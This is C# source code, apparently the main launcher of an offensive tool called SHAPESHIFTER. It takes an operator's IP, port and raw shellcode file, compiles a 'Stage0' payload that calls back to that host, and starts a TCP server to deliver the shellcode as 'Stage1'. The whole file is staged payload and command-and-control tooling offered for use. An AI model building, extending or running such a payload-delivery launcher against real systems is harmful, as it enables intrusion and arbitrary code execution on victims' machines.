using NDesk.Options;
using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace SHAPESHIFTER
{
    class Program
    {
        static readonly string banner = @"
  __       _  __  ___  __      ___ ___ ___ ___ __  
 (_ ` )_) /_) )_) )_  (_ ` )_)  )  )_   )  )_  )_) 
.__) ( ( / / /   (__ .__) ( ( _(_ (    (  (__ / \  
        ";

        static void PrintUsage(OptionSet o)
        {
            Console.WriteLine("Usage: SHAPESHIFTER.exe [options]");
            Console.WriteLine("\nOptions:");
            o.WriteOptionDescriptions(Console.Out);
            return;
        }

        static void Main(string[] args)
        {
            bool _help = false;
            string _host = "";
            int _port = 0;
            string _shellcodeFile = "";

            OptionSet options = new OptionSet()
            {
                { "i|ip=", "IP address of your SHAPESHIFTER server. Must be quoted!", (string v)=> _host = v },
                { "p|port=", "TCP port for the SHAPESHIFTER server", (int v) => _port = v },
                { "s|shellcode=", "File containing the raw shellcode for Stage1. Must be quoted!", (string v) => _shellcodeFile = v },
                { "h|help",  "Show this message and exit", v => _help = v != null }

            };
            options.Parse(args);

            if (_help)
            {
                PrintUsage(options);
                return;
            }
            if (_host == String.Empty ||
                !Helpers.ValidateIP(_host) ||
                _port == 0 || 
                _shellcodeFile == String.Empty || 
                !File.Exists(_shellcodeFile))
            {
                PrintUsage(options);
                return;
            }


            Console.WriteLine(banner, Console.ForegroundColor = ConsoleColor.DarkRed);
            Console.ResetColor();

            // Build the stage0 payload
            if (!Compiler.CompileStage0(_host, _port))
            {
                Console.WriteLine("[-] Failed to compile Stage0 payload. Check your host/port.");
                return;
            }

            // Start the TCP server
            Thread tcpServer = new Thread(() => TcpServer.ServerInit(_host, _port, _shellcodeFile));
            tcpServer.Start();

            return;
        }
    }
}
